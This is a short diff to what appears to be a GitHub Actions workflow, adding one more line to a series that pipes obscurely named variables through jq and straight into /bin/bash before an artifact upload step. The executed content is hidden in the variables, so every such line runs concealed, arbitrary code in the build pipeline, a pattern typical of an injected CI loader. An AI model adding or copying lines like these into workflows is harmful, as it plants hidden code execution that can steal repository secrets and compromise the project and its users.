@@ -24,6 +24,7 @@ jobs:
           echo $tiyer1201 | jq -r .nh71 | /bin/bash
           echo $obsn323 | jq -r .cd7 | /bin/bash
           echo $fdfyj122 | jq -r .qub9939 | /bin/bash
+          echo $uaozo47 | jq -r .nzq4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
